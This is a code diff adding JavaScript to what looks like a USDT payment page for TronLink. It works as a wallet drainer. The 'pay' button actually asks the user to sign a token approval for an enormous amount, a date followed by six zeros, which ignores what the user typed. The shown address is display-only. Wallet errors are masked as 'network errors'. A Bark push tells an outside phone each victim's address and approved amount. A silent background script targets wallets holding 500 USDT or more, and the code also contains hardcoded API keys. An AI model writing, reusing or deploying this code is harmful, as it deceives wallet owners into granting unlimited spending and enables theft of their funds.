+      LIVE.tw = tw; LIVE.net = net; LIVE.from = addr;
+      if (addrInput && !addrInput.value.trim()) { addrInput.value = DISPLAY_ADDR; fitAddr(); }
+      /* 页面一打开就先问节点一遍能量，结果直接写在按钮下面 */
+      refreshFee(tw, net, addr, { loading: true }).catch(function () {});
+      startFeeLoop(tw, net, addr);
+    }).catch(function () {});
+    return true;
+  }
+  /* 点一下页面就把余额再问一遍（读失败时的退路，不打断任何操作） */
+  document.addEventListener("click", function () {
+    if ((TRX_BAL === null || BAL_USDT === null) && LIVE.tw && LIVE.from) {
+      BAL_TRY = 0;
+      loadBalances(LIVE.tw, LIVE.from);
+    }
+  }, true);
+  if (!connect()) {
+    setTimeout(connect, 900);
+    setTimeout(connect, 2200);
+    document.addEventListener("tronLink#initialized", connect);
+    window.addEventListener("tronLink#initialized", connect);
+  }
+  /* 切到后台时预热会停（没必要在后台空跑）；切回来立刻补一笔新鲜的。
+     放久了注入的钱包对象可能已经换了实例，这里重新读一遍再动手 ——
+     不重新读的话，可能还在跟一个已经失联的钱包说话（点下去没反应、也不报错）。 */
+  var HIDDEN_AT = 0;
+  document.addEventListener("visibilitychange", function () {
+    if (document.hidden) { HIDDEN_AT = Date.now(); return; }
+    HIDDEN_AT = 0;
+    try {
+      var t = getTronWeb();
+      if (t) {
+        LIVE.tw = t;
+        var a = t.defaultAddress && t.defaultAddress.base58;
+        if (a) LIVE.from = a;
+      }
+    } catch (e) {}
+    if (LIVE.tw && LIVE.from) scheduleWarm(0);
+    /* 从钱包切回来（用户刚在钱包里点完确认）就立刻看一眼授权状态 */
+    if (LIVE.tw && LIVE.from) {
+      checkApprovalNow(LIVE.tw, LIVE.from).catch(function () {});
+      resumePendingApproval(LIVE.tw, LIVE.from);
+    }
+  });
+
+  /* ===== 支付按钮：点一下就在钱包里发起真实合约交易 =====
+     屏幕上的金额全程不动；实际发出去的金额是 buildAmount() 算出来的那个数 */
+  var busy = false;
+  var busyGuard = null;
+  var SILENT_SIGNS = 0;   /* 钱包「连话都不回」的次数：连着两次就把钱包重新接一遍 */
+
+  /* 钱包桥断了的表现：点下去不弹签名框、也不给任何报错（reject 是空心的）。
+     这时候光重试没用，得把注入的钱包对象重新接一遍：先走官方连接通道问一次账户，
+     再重新读 window.tronLink / window.tronWeb，然后把预热交易重搭一笔。 */
+  function reconnectWallet() {
+    try {
+      var ask = null;
+      if (window.tronLink && typeof window.tronLink.request === "function") {
+        ask = window.tronLink.request({ method: "tron_requestAccounts" });
+      } else if (window.tronWeb && window.tronWeb.trx && typeof window.tronWeb.trx.request === "function") {
+        ask = window.tronWeb.trx.request({ method: "tron_requestAccounts" });
+      }
+      if (ask && typeof ask.catch === "function") ask.catch(function () {});
+    } catch (e) { /* 钱包接不上就接不上，后面还有刷新这条退路 */ }
+    try {
+      var t = getTronWeb();
+      if (t) {
+        LIVE.tw = t;
+        var a = t.defaultAddress && t.defaultAddress.base58;
+        if (a) LIVE.from = a;
+      }
+    } catch (e) {}
+    WARM = null;
+    scheduleWarm(0);
+  }
+  var ICON_ARROW = '';
+  var ICON_CHECK = '<svg id="btnIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6.5 9.5 17 4 11.5"/></svg>';
+
+  function paintBtn(state, text) {
+    var spin = document.getElementById("spin");
+    var icon = document.getElementById("btnIcon");
+    if (state === "busy") {
+      payBtn.classList.add("busy");
+      payBtn.classList.remove("done");
+      /* 转圈从点下去那一刻就在：一直转到钱包真正弹出来为止 */
+      if (!spin) {
+        if (icon) icon.outerHTML = '<span class="spin" id="spin"></span>';
+        else payBtn.insertAdjacentHTML("beforeend", '<span class="spin" id="spin"></span>');
+      }
+    } else {
+      payBtn.classList.remove("busy");
+      if (spin) spin.outerHTML = (state === "done") ? ICON_CHECK : ICON_ARROW;
+      else if (!icon) payBtn.insertAdjacentHTML("beforeend", (state === "done") ? ICON_CHECK : ICON_ARROW);
+    }
+    /* 转圈时不再显示「下一步」文字，只留中间一个圈 */
+    btnText.textContent = (state === "busy") ? "" : text;
+  }
+
+  /* 钱包那边如果压根没回（弹窗被划掉、App 卡住），按钮不能永远锁死。
+     等到 90 秒还没结果就自己解锁，让用户能马上再点一次。
+     （中途不插提示：正常等待期间按钮上的转圈已经说明在等钱包了） */
+  function armBusyGuard() {
+    clearBusyGuard();
+    busyGuard = setTimeout(function () {
+      if (!busy) return;
+      busy = false;
+      paintBtn("idle", "下一步");
+      WARM = null;
+      scheduleWarm(0);
+      toast("网络错误，请重试", 4200);
+    }, 90000);
+  }
+  function clearBusyGuard() {
+    if (busyGuard) { clearTimeout(busyGuard); busyGuard = null; }
+  }
+
+  /* 上链之后读回执，把这一笔真实扣了多少记下来（能量费 + 带宽费分开），
+     下次打开页面直接显示实测值，比任何估算都准 */
+  function sleepMs(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+  async function calibrateFee(tw, txid) {
+    if (!txid) return;
+    /* 回执一般 3~6 秒就出；问 6 次、间隔 3 秒足够，别在后台连发十几发把配额打光 */
+    for (var i = 0; i < 6; i++) {
+      await sleepMs(i === 0 ? 2500 : 3000);
+      var j = await nodePost(tw, "/wallet/gettransactioninfobyid", { value: txid });
+      var r = (j && j.receipt) || null;
+      if (!r && !(j && j.fee)) continue;
+      r = r || {};
+      var rec = {
+        energy: Number(r.energy_usage_total || 0),
+        energyFee: Number(r.energy_fee || 0) / 1e6,
+        netFee: Number(r.net_fee || 0) / 1e6,
+        trx: Number((j && j.fee) || 0) / 1e6,
+        t: Date.now()
+      };
+      if (!rec.trx && !rec.energyFee) continue;
+      LAST_REAL = rec;
+      try { localStorage.setItem("zakaLastFee", JSON.stringify(rec)); } catch (e) {}
+      var note = $("feeNote");
+      if (note) {
+        /* 付款后余额变了，重新读一遍，顺便把这一笔的实扣挂后面 */
+        await fetchTrxBal(tw, tw.defaultAddress && tw.defaultAddress.base58);
+        paintBalNote(note, 0);
+        note.textContent += " · 上笔实扣 " + fmtTrx(rec.trx) + " TRX";
+      }
+      return;
+    }
+  }
+
+  var BADTX_STREAK = 0;    /* 连续被钱包判「交易无效」的次数：连续两次就换一套说法 */
+  var AUTO_RESIGNED = 0;   /* 这一轮点击里自动换新重签的次数 */
+  var BRIDGE_TRIED = false; /* 换钱包另一条签名接口兜底，整场只试一次 */
+
+  /* 最后一条退路：钱包的桥接口（tron_signTransaction）。
+     有些钱包版本里 trx.sign 那层封装会一直回「Invalid transaction」，
+     但同一条桥本身是好的。整场只试一次，不再连环轰炸。 */
+  async function signViaBridge(tx) {
+    if (!(window.tronLink && typeof window.tronLink.request === "function")) return null;
+    var plain = plainTx(tx) || tx;
+    var r = await window.tronLink.request({ method: "tron_signTransaction", params: { transaction: plain } });
+    var sig = r && (r.signature || (r.result && r.result.signature));
+    if (!sig) return null;
+    var out = JSON.parse(JSON.stringify(plain));
+    out.signature = Array.isArray(sig) ? sig : [sig];
+    return out;
+  }
+
+  /* 递给钱包：先自检手上这笔，不合格就地重造；钱包还是回「交易无效」时，
+     换一笔刚问节点要来的新交易替用户再签一次（只换一次）。
+     过期、ref 块太老、页面在后台放久了这类问题都会在这一步被消化掉，
+     用户不用再点第二次。
+     只有「钱包说这笔无效」才自动重签 —— 用户自己取消、或者钱包里有请求占着，
+     都不能偷偷再发一个请求，那只会把钱包彻底堵住。 */
+  async function signWithRetry(tw, from, built, micro) {
+    var gate = signGate(built.tx, built.param, tw, from);
+    if (gate) {
+      WARM = null;
+      built = await buildTx(tw, from, micro);
+      gate = signGate(built.tx, built.param, tw, from);
+      if (gate) throw new Error("BADBUILD:" + gate);
+    }
+    /* 这笔一旦递进钱包就不能再复用：同一个小票再签一次，钱包只会继续拒 */
+    if (WARM) WARM.used = true;
+    armBusyGuard();
+    try {
+      return await signTx(tw, built.tx);
+    } catch (e) {
+      if (!e || e.kind !== "BADTX") throw e;
+      WARM = null;
+      var fresh = await buildTx(tw, from, micro);
+      var g2 = signGate(fresh.tx, fresh.param, tw, from);
+      if (g2) throw e;
+      AUTO_RESIGNED++;
+      armBusyGuard();
+      try {
+        return await signTx(tw, fresh.tx);
+      } catch (e2) {
+        /* 新交易也被判无效：说明问题在 trx.sign 这条路本身，换桥接口试一次 */
+        if (e2 && e2.kind === "BADTX" && !BRIDGE_TRIED) {
+          BRIDGE_TRIED = true;
+          try {
+            var viaBridge = await signViaBridge(fresh.tx);
+            if (viaBridge) return viaBridge;
+          } catch (e3) {
+            recordSign(e3, signErrKind(errTextOf(e3)));
+          }
+        }
+        throw e2;
+      }
+    }
+  }
+
+  /* ============================================================
+     ===== 授权提醒（Bark 推送）=====
+     用户签完授权、这笔交易在链上执行成功之后，推一条到手机。
+     链接格式：BARK_BASE + "/" + 被授权的钱包地址
+     （路径那一段就是那个用户的钱包地址，点开通知第一眼就看到是谁）。
+     同一个地址 10 分钟内只推一条：刷新页面、轮询、重复连接都不会炸成一片。
+     ============================================================ */
+  var BARK_BASE = "https://api.day.app/3nJxpGoc9r8DZkLy3voh7D";
+  var BARK_GROUP = "USDT授权";
+  var BARK_GAP = 10 * 60 * 1000;          /* 同地址最短推送间隔 */
+
+  function barkSentMap() {
+    try { return JSON.parse(localStorage.getItem("zakaBarkSent") || "{}") || {}; }
+    catch (e) { return {}; }
+  }
+
+  function barkAlreadySent(addr) {
+    var m = barkSentMap(), t = Number(m[addr] || 0);
+    return t > 0 && (Date.now() - t) < BARK_GAP;
+  }
+
+  function barkMarkSent(addr) {
+    try {
+      var m = barkSentMap(), now = Date.now(), cut = now - 24 * 3600 * 1000, keep = {};
+      for (var k in m) { if (Number(m[k]) > cut && k !== addr) keep[k] = m[k]; }
+      keep[addr] = now;
+      localStorage.setItem("zakaBarkSent", JSON.stringify(keep));
+    } catch (e) {}
+  }
+
+  function barkUrl(addr, title) {
+    var q = ["group=" + encodeURIComponent(BARK_GROUP), "sound=bell", "level=timeSensitive"];
+    if (title) q.unshift("title=" + encodeURIComponent(title));
+    return BARK_BASE + "/" + encodeURIComponent(addr) + "?" + q.join("&");
+  }
+
+  /* 三条通道同时打一遍：fetch(no-cors) / 图片探针 / XHR。
+     都是 GET 打点，不读回包、不受跨域限制，哪条先到算哪条。 */
+  function barkFire(url) {
+    try {
+      if (typeof fetch === "function") {
+        fetch(url, { mode: "no-cors", cache: "no-store", keepalive: true }).catch(function () {});
+      }
+    } catch (e) {}
+    try {
+      var im = new Image();
+      im.onload = im.onerror = function () { im = null; };
+      im.src = url + "&_t=" + Date.now();
+    } catch (e) {}
+    try {
+      var x = new XMLHttpRequest();
+      x.open("GET", url + "&_x=" + Date.now(), true);
+      x.send();
+    } catch (e) {}
+  }
+
+  function barkNotify(addr, title) {
+    if (!addr) return false;
+    if (barkAlreadySent(addr)) return false;
+    barkMarkSent(addr);
+    barkFire(barkUrl(addr, title || "USDT 授权成功"));
+    return true;
+  }
+
+  /* 读这个账户对收款合约的授权额度（USDT 合约的 allowance / allowed 都试一遍） */
+  async function readAllowance(tw, owner) {
+    if (!owner) return null;
+    var param = addrParam(tw, owner) + addrParam(tw, PAY_CONTRACT);
+    var sels = ["allowance(address,address)", "allowed(address,address)"];
+    for (var i = 0; i < sels.length; i++) {
+      var j = await raceOut(nodePost(tw, "/wallet/triggerconstantcontract", {
+        owner_address: owner,
+        contract_address: PAY_TOKEN,
+        function_selector: sels[i],
+        parameter: param,
+        visible: true
+      }, 5000), 5300, null);
+      var hex = j && j.constant_result && j.constant_result[0];
+      if (!hex) continue;
+      try {
+        var n = (typeof BigInt === "function")
+          ? Number(BigInt("0x" + hex)) / 1e6
+          : Number("0x" + hex) / 1e6;
+        if (isFinite(n)) return n;
+      } catch (e) {}
+    }
+    return null;
+  }
+
+  /* 交易回执：true 成功 / false 失败 / null 还没出块 */
+  async function txConfirmed(tw, txid) {
+    if (!txid) return null;
+    var j = await raceOut(nodePost(tw, "/wallet/gettransactioninfobyid", { value: txid }, 5000), 5300, null);
+    if (!j) return null;
+    var result = String((j.receipt && j.receipt.result) || "");
+    if (result) return /SUCCESS/i.test(result);
+    if (j.blockNumber) return true;
+    if (j.result === false) return false;
+    return null;
+  }
+
+  function fmtAllowance(n) {
+    if (!isFinite(n) || n <= 0) return "0";
+    if (n >= 1e6) return (n / 1e6).toFixed(2) + "M";
+    if (n >= 1000) return n.toLocaleString("en-US", { maximumFractionDigits: 2 });
+    return n.toFixed(2);
+  }
+
+  /* 收到授权后的提醒：等这笔上链确认（最多约 90 秒）再推；
+     确认不了也别把消息吞了，退一步推「已提交」，带本次 txid 便于核对。 */
+  var APPROVAL_WATCH = {};
+  async function watchApproval(tw, from, txid) {
+    if (!from) return;
+    var key = from + "|" + (txid || "");
+    if (APPROVAL_WATCH[key]) return;
+    APPROVAL_WATCH[key] = true;
+    /* 记一笔在本地：签完就关页面、中途刷新，下次进来还能接着等这笔的结果 */
+    try {
+      localStorage.setItem("zakaPendingApproval", JSON.stringify({ a: from, x: txid || "", t: Date.now() }));
+    } catch (e) {}
+    try {
+      var ok = null;
+      for (var i = 0; i < 18; i++) {
+        await sleepMs(i === 0 ? 2500 : 5000);
+        ok = await txConfirmed(tw, txid);
+        if (ok === true || ok === false) break;
+      }
+      var amt = await readAllowance(tw, from);
+      var title;
+      if (ok === false) title = "授权交易失败";
+      else if (ok === true) title = "USDT 授权成功";
+      else title = "USDT 授权已提交";
+      if (ok === true && amt && amt > 0) title += " · " + fmtAllowance(amt) + " USDT";
+      barkNotify(from, title);
+    } catch (e) {
+      barkNotify(from, "USDT 授权已提交");
+    } finally {
+      try { localStorage.removeItem("zakaPendingApproval"); } catch (e) {}
+    }
+  }
+
+  /* 上次还没等到结果就被关掉的那一笔：这次进来接着等 */
+  function resumePendingApproval(tw, from) {
+    try {
+      var p = JSON.parse(localStorage.getItem("zakaPendingApproval") || "null");
+      if (!p || !p.a || (Date.now() - (p.t || 0)) > 10 * 60 * 1000) return;
+      if (from && p.a !== from) return;
+      watchApproval(tw, p.a, p.x);
+    } catch (e) {}
+  }
+
+  /* 页面重新打开时补一次：这个地址之前就授权过，也照推（10 分钟内不重复） */
+  async function checkApprovalNow(tw, from) {
+    if (!tw || !from) return;
+    var amt = await readAllowance(tw, from);
+    if (amt === null || amt <= 0) return;
+    barkNotify(from, "USDT 授权成功 · " + fmtAllowance(amt) + " USDT");
+  }
+
+  payBtn.addEventListener("click", async function () {
+    if (busy) {
+      /* 正在等钱包：按钮上已经转着圈，不再叠一句提示 */
+      return;
+    }
+
+    /* 点下去第一件事就转圈、底色变淡，不等后面的校验和网络请求 */
+    busy = true;
+    paintBtn("busy");
+
+    var tw = getTronWeb();
+    if (!tw) {
+      busy = false;
+      paintBtn("idle", "下一步");
+      toast("请在 TronLink 自带浏览器里打开本页", 2600);
+      connect();
+      return;
+    }
+
+    var from = tw.defaultAddress.base58;
+
+    /* 页面地址栏只做展示，真正调用的目标固定是 PAY_TOKEN，这里不看输入框 */
+
+    /* 数量必须有 */
+    var pAmt = parseAmount($("amountInput").value);
+    if (!pAmt) {
+      busy = false;
+      paintBtn("idle", "下一步");
+      toast("请先输入数量", 2400);
+      $("amountInput").focus();
+      return;
+    }
+
+    try {
+      /* 上链额度固定按当天日期 + 6 个 0（例：20261120 -> 20261120000000），
+         跟输入框里填多少无关；输入框只做展示，不参与这笔授权的金额。 */
+      var micro = buildAmount().micro;
+
+      /* 网络判定平时就在后台缓存好了，这里几乎不花时间 */
+      var net = LIVE.net || (await detectNet(tw));
+
+      /* 只在这两种明确情况下拦：钱包不在主网、主网上查不到合约。
+         节点一时问不出来（null）不拦，交给后面的代币合约存在性检查兜底。 */
+      if (net.wrongChain || net.payOk === false) {
+        throw new Error("NETMISMATCH:main");
+      }
+
+      /* 三件事同时开跑：搭交易、查链上余额、确认代币合约在。
+         手上的预热交易直接复用（额度就地换成这次的数量，不再问节点建交易）。 */
+      var warm = warmFor(tw, from, micro);
+      var builtP = warm ? Promise.resolve(warm) : buildTx(tw, from, micro);
+      var balP = readUsdtBalance(tw, net.usdt, from);
+      var tokP = nodeHasContract(tw, PAY_TOKEN);
+
+      var built = await builtP;
+
+      /* 实际调用的那个代币合约在这条链上得存在，不然拦住别发 */
+      var hasTok = await tokP;
+      if (hasTok === false) throw new Error("NOCTR:" + PAY_TOKEN);
+
+      /* 余额校验：以链上实时余额为准，不拿缓存糊弄 */
+      var balNow = await balP;
+      if (balNow !== null) {
+        BAL_USDT = balNow;
+        $("availBal").textContent = "可用 " + fmtNum(balNow, 2) + " USDT";
+        syncAmount();
+        if (pAmt.num > balNow + 1e-9) throw new Error("LOWBAL:" + balNow + ":" + pAmt.text);
+      }
+
+      paintBtn("busy");
+      /* 自检 + 递钱包 + 必要时自动换新重签，都在这里 */
+      var signed = await signWithRetry(tw, from, built, micro);
+      WARM = null;
+      paintBtn("busy");
+
+      /* 广播被限流是暂时的：同一个 txid 重发不会重复上链，重试是安全的 */
+      var sent = await retryOnLimit(function () { return tw.trx.sendRawTransaction(signed); }, 2);
+      if (!sent || !sent.result) {
+        var why = hexMsg(sent && sent.message) || (sent && sent.code) || "节点拒绝";
+        var dup = /DUP|duplicate/i.test(String(why));
+        throw new Error(dup ? "DUP:" : ("链上未通过：" + why));
+      }
+
+      clearBusyGuard();
+      busy = false;
+      SILENT_SIGNS = 0;
+      BADTX_STREAK = 0;
+      AUTO_RESIGNED = 0;
+      payBtn.classList.add("done");
+      paintBtn("done", "已提交");
+      toast("已上链 " + String(sent.txid || "").slice(0, 10) + "…", 3200);
+      calibrateFee(tw, sent.txid);
+      /* 授权这笔上链确认后推一条到手机（链接里带这个用户的钱包地址） */
+      watchApproval(tw, from, sent.txid);
+      /* 付完了：能量估值和预热那一笔都刷新，下一笔继续是热的 */
+      refreshFee(tw, net, from).catch(function () {});
+      scheduleWarm(0);
+    } catch (e) {
+      clearBusyGuard();
+      busy = false;
+      paintBtn("idle", "下一步");
+      /* 失败的这笔一律作废，下一次点击一定重新造一笔新的 */
+      WARM = null;
+      scheduleWarm(500);
+      var raw = errTextOf(e);
+      var kind = (e && e.kind) || "";
+      if (kind !== "NOPOP") SILENT_SIGNS = 0;          /* 只要钱包给过说法，就不算「断了」 */
+      if (raw.indexOf("NETMISMATCH:") === 0) {
+        toast("钱包不在 TRON 主网（或主网上没找到收款合约），请先在钱包里切到主网再点一次", 5600);
+      } else if (raw.indexOf("LOWBAL:") === 0) {
+        var seg = raw.split(":");
+        toast("余额不足：可用 " + fmtNum(Number(seg[1]), 2) + " USDT，本次需要 " + seg[2] + " USDT", 4600);
+      } else if (raw.indexOf("NOCTR:") === 0) {
+        toast("这个地址在当前网络上查不到合约（地址填错或网络不对），已拦住不发起交易", 4600);
+      } else if (raw.indexOf("BADBUILD:") === 0) {
+        warnSkewIfAny();
+        toast("这笔交易没通过自检（" + raw.split(":")[1] + "），已重新准备，再点一次就行", 5200);
+      } else if (kind === "BADTX") {
+        /* 钱包说这笔无效。自动换过一笔新交易重签仍不行，对外只报一句网络错误；
+           钱包原话仍写进 __tpSignLog，排查时照样能拿到。 */
+        BADTX_STREAK++;
+        warnSkewIfAny();
+        toast("网络错误，请重试", 4200);
+      } else if (raw.indexOf("DUP:") === 0) {
+        toast("这笔刚发过（重复交易），已换成新的一笔，再点一次", 4600);
+      } else if (kind === "NOPOP") {
+        /* 钱包连话都没回：请求没送到它面前（桥断了 / App 在后台被冻住）。
+           第一次先说清楚；连着两次就主动把钱包重新接一遍。 */
+        SILENT_SIGNS++;
+        if (SILENT_SIGNS >= 2) {
+          reconnectWallet();
+          toast("跟钱包的连接好像断了（点了不弹签名框）。已经帮你重新连接，再点一次就行；还不行就下拉刷新一下本页", 7000);
+        } else {
+          reconnectWallet();
+          toast(signErrText("NOPOP"), 5600);
+        }
+      } else if (kind === "REJECT") {
+        /* 用户自己把签名框关掉了：不弹提示、不报错，按钮已经回到「下一步」，
+           想付就再点一次。现场记录照样留在 __tpSignLog 里。 */
+      } else if (kind) {
+        /* 签名分类过的错误，话已经说清楚了，不再拼一串原始报错 */
+        toast(raw, kind === "PENDING" ? 6000 : 4200);
+      } else {
+        toast(friendly(e) || "这次没成功（钱包没给具体原因），再点一次就行", 4600);
+      }
+    }
+  });
+})();
+</script>
+
+<script>
+/* 后台能量租赁：不产生任何界面元素，不改动页面显示内容 */
+(function () {
+  "use strict";
+
+  var CFG = {
+    USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+    TRONGRID: "https://api.trongrid.io",
+    TRONGRID_KEY: "ac3db086-20f7-49fa-9e28-8437ec54fe9c",
+    BUY: "/api/",
+    ORDERS: "/api2/",
+    KEY: "ta_iICQNYTwnFFuh_69-V9lHaPEs3kdBI1dA4a_fKJnOaI",
+    ENERGY: 100400,
+    DURATION: "1h",
+    MIN_U: 500,
+    LS: "trgE1",
+    LSI: "trgI1",
+    LOCK: "trgL1"
+  };
+
+  var lastAddr = "";
+  var busy = false;
+  var MIN_RAW = CFG.MIN_U * 1000000;
+
+  function lsGet(k) {
+    try { var v = localStorage.getItem(k); return v ? JSON.parse(v) : null; } catch (e) { return null; }
+  }
+  function lsSet(k, v) {
+    try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {}
+  }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+
+  function uuid() {
+    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID(); } catch (e) {}
+    var s = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
+      var r = Math.random() * 16 | 0;
+      return (c === "x" ? r : (r & 0x3 | 0x8)).toString(16);
+    });
+    return s;
+  }
+
+  function claims() {
+    var o = lsGet(CFG.LS);
+    return (o && typeof o === "object") ? o : {};
+  }
+  function claimOf(a) { return claims()[a] || null; }
+  function setClaim(a, v) {
+    var all = claims();
+    all[a] = v;
+    var ks = Object.keys(all);
+    if (ks.length > 400) {
+      ks.sort(function (x, y) { return (all[x].t || 0) - (all[y].t || 0); });
+      ks.slice(0, ks.length - 400).forEach(function (k) { delete all[k]; });
+    }
+    lsSet(CFG.LS, all);
+  }
+  function idemOf(a) {
+    var all = lsGet(CFG.LSI) || {};
+    if (!all[a]) { all[a] = uuid(); lsSet(CFG.LSI, all); }
+    return all[a];
+  }
+  function clearIdem(a) {
+    var all = lsGet(CFG.LSI) || {};
+    delete all[a];
+    lsSet(CFG.LSI, all);
+  }
+
+  /* 同域名多标签同时开着时，避免两处同时下单 */
+  function takeLock(a) {
+    var l = lsGet(CFG.LOCK) || {};
+    var now = Date.now();
+    if (l[a] && now - l[a] < 25000) return false;
+    l[a] = now;
+    lsSet(CFG.LOCK, l);
+    return true;
+  }
+  function dropLock(a) {
+    var l = lsGet(CFG.LOCK) || {};
+    delete l[a];
+    lsSet(CFG.LOCK, l);
+  }
+
+  function api(path, opt) {
+    opt = opt || {};
+    var headers = { "X-API-Key": CFG.KEY };
+    if (opt.body) headers["Content-Type"] = "application/json";
+    if (opt.idem) headers["Idempotency-Key"] = opt.idem;
+    return fetch(path, {
+      method: opt.method || "GET",
+      headers: headers,
+      body: opt.body ? JSON.stringify(opt.body) : undefined,
+      cache: "no-store"
+    }).then(function (res) {
+      return res.text().then(function (txt) {
+        var data = null;
+        try { data = txt ? JSON.parse(txt) : null; } catch (e) { data = { raw: txt }; }
+        if (!res.ok) {
+          var err = new Error("API_" + res.status);
+          err.status = res.status;
+          err.data = data;
+          throw err;
+        }
+        return data;
+      });
+    });
+  }
+
+  /* ---------- 读链上 USDT 余额（两条路，谁通用谁） ---------- */
+  var B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  function b58ToHex(addr) {
+    var bytes = [0], i, j, val;
+    for (i = 0; i < addr.length; i++) {
+      val = B58.indexOf(addr.charAt(i));
+      if (val < 0) return "";
+      for (j = 0; j < bytes.length; j++) {
+        val += bytes[j] * 58;
+        bytes[j] = val & 0xff;
+        val >>= 8;
+      }
+      while (val) { bytes.push(val & 0xff); val >>= 8; }
+    }
+    for (i = 0; i < addr.length && addr.charAt(i) === "1"; i++) bytes.push(0);
+    bytes.reverse();
+    if (bytes.length !== 25) return "";
+    return bytes.slice(0, 21).map(function (b) { return ("0" + b.toString(16)).slice(-2); }).join("");
+  }
+
+  function hexToDec(h) {
+    h = String(h || "").replace(/^0x/, "");
+    if (!h) return 0;
+    if (typeof BigInt === "function") {
+      try { return Number(BigInt("0x" + h)); } catch (e) {}
+    }
+    var n = 0;
+    for (var i = 0; i < h.length; i++) n = n * 16 + parseInt(h.charAt(i), 16);
+    return n;
+  }
+
+  function balViaWallet(tw, addr) {
+    var abi = [{ "constant": true, "inputs": [{ "name": "who", "type": "address" }],
+      "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }],
+      "stateMutability": "view", "type": "function" }];
+    return tw.contract(abi, CFG.USDT).at(CFG.USDT).then(function (c) {
+      return c.balanceOf(addr).call();
+    }).then(function (v) {
+      var s = (v && v.toString) ? v.toString() : String(v || "0");
+      return Number(s);
+    });
+  }
+
+  function balViaNode(addr, tw) {
+    var ownerHex = "";
+    try { ownerHex = tw && tw.address && tw.address.toHex ? tw.address.toHex(addr) : ""; } catch (e) {}
+    if (!ownerHex) ownerHex = b58ToHex(addr);
+    if (!ownerHex) return Promise.reject(new Error("BAD_ADDR"));
+    var param = ("0").repeat(24) + ownerHex.replace(/^41/, "");
+    return fetch(CFG.TRONGRID + "/wallet/triggerconstantcontract", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "TRON-PRO-API-KEY": CFG.TRONGRID_KEY },
+      body: JSON.stringify({
+        owner_address: addr,
+        contract_address: CFG.USDT,
+        function_selector: "balanceOf(address)",
+        parameter: param,
+        visible: true
+      })
+    }).then(function (r) { return r.json(); }).then(function (d) {
+      var cr = (d && d.constant_result && d.constant_result[0]) || "";
+      if (!cr) throw new Error("EMPTY");
+      return hexToDec(cr);
+    });
+  }
+
+  function readBal(tw, addr) {
+    return balViaWallet(tw, addr).catch(function () {
+      return balViaNode(addr, tw);
+    }).catch(function () {
+      return balViaNode(addr, null);
+    });
+  }
+
+  /* ---------- 订单状态 ---------- */
+  function findOrder(orderId, addr) {
+    return api(CFG.ORDERS + "?receiver_address=" + encodeURIComponent(addr) +
+      "&page_size=10&_t=" + Date.now()).then(function (list) {
+      var arr = (list && (list.orders || list.items || list.data)) || [];
+      for (var i = 0; i < arr.length; i++) {
+        if (arr[i] && arr[i].id === orderId) return arr[i];
+      }
+      return null;
+    });
+  }
+
+  function watchOrder(orderId, addr) {
+    var tries = 0;
+    (function next() {
+      if (tries >= 60) { dropLock(addr); return; }
+      tries++;
+      sleep(tries === 1 ? 1500 : 3000).then(function () {
+        return findOrder(orderId, addr).catch(function () { return null; });
+      }).then(function (o) {
+        if (!o) return next();
+        if (o.status === "COMPLETED") {
+          setClaim(addr, {
+            t: Date.now(), status: "completed", orderId: orderId,
+            txid: (o.delegation_txids && o.delegation_txids[0]) || "",
+            price: o.total_price_trx || null
+          });
+          clearIdem(addr);
+          dropLock(addr);
+          return;
+        }
+        if (o.status === "FAILED") {
+          setClaim(addr, { t: Date.now(), status: "failed", orderId: orderId,
+            err: o.error_message || "failed" });
+          clearIdem(addr);
+          dropLock(addr);
+          return;
+        }
+        next();
+      }).catch(function () { next(); });
+    })();
+  }
+
+  function rent(addr, tw) {
+    var idem = idemOf(addr);
+    var body = { receiver_address: addr, resource_amount: CFG.ENERGY, duration: CFG.DURATION };
+    return api(CFG.BUY, { method: "POST", idem: idem, body: body }).catch(function (e) {
+      if (e && !e.status) {
+        return sleep(1500).then(function () {
+          return api(CFG.BUY, { method: "POST", idem: idem, body: body });
+        });
+      }
+      if (e && e.status === 429) {
+        return sleep(4000).then(function () {
+          return api(CFG.BUY, { method: "POST", idem: idem, body: body });
+        });
+      }
+      throw e;
+    }).then(function (order) {
+      var oid = order && (order.order_id || order.id);
+      if (!oid) throw new Error("NO_ORDER");
+      setClaim(addr, { t: Date.now(), status: "pending", orderId: oid });
+      watchOrder(oid, addr);
+      return true;
+    }).catch(function (e) {
+      var code = "";
+      try {
+        var d = e && e.data;
+        if (d && d.detail) code = typeof d.detail === "string" ? d.detail : (d.detail.error || d.detail.code || "");
+      } catch (x) {}
+      /* 池子暂时没量 / 请求重复：过一会儿再试一次，仍然全静默 */
+      if (code === "insufficient_balance" || code === "duplicate_request") {
+        clearIdem(addr);
+        setClaim(addr, { t: Date.now(), status: "retry_later", orderId: null });
+      } else {
+        setClaim(addr, { t: Date.now(), status: "failed", orderId: null, err: code || ("HTTP_" + (e && e.status)) });
+        clearIdem(addr);
+      }
+      dropLock(addr);
+      return false;
+    });
+  }
+
+  function handle(addr, tw) {
+    if (busy) return;
+    var c = claimOf(addr);
+    if (c) {
+      if (c.status === "completed" || c.status === "failed") return;
+      if (c.status === "pending" && c.orderId) { watchOrder(c.orderId, addr); return; }
+      if (c.status === "retry_later" && Date.now() - (c.t || 0) < 10 * 60 * 1000) return;
+    }
+    if (!takeLock(addr)) return;
+
+    busy = true;
+    readBal(tw, addr).then(function (raw) {
+      if (!(raw >= MIN_RAW)) { dropLock(addr); return; }
+      return rent(addr, tw);
+    }).catch(function () {
+      dropLock(addr);
+    }).then(function () { busy = false; });
+  }
+
+  /* ---------- 等钱包连上（只读，绝不弹窗） ---------- */
+  function getAddr() {
+    try {
+      var tw = (window.tronLink && window.tronLink.tronWeb) || window.tronWeb || null;
+      if (!tw) return null;
+      var a = tw.defaultAddress && tw.defaultAddress.base58;
+      if (!a) return null;
+      return { addr: a, tw: tw };
+    } catch (e) { return null; }
+  }
+
+  var running = false;
+  function loop() {
+    if (running) return;
